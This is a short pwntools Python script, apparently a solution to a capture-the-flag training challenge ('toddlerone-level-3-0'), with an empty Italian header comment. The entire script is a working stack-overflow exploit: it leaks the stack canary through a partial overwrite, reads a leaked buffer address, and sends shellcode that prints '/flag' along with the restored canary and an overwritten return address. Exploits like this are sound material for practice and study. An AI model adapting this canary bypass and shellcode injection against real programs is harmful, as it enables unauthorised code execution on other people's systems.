#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --

'''

context.log_level = 'CRITICAL'
context.arch = 'amd64'

elf = ELF('/challenge/toddlerone-level-3-0')

p = elf.process()

delta_len = 72
canary_dist = delta_len - 16 - len('REPEAT')
bytestream = b'REPEAT' + b'A' * canary_dist + b'X'
p.sendline(f'{len(bytestream)}'.encode())
p.sendline(bytestream)

p.recvuntil(b'X')
canary = p64(u64(p.recv(7).rjust(8, b'\x00')))

p.recvuntil(b'The input buffer begins at 0x')
addr = p.recvuntil(b',').decode()[:-1]
buffer_addr = p64(int(addr, 16))

assembly = shellcraft.cat('/flag')
shellcode = asm(assembly)

canary_dist = 56
padding = b'A' * (canary_dist - len(shellcode))
bytestream = shellcode + padding + canary + b'A' * 8 + buffer_addr

p.sendline(f'{len(bytestream)}'.encode())
p.sendline(bytestream)
p.interactive()
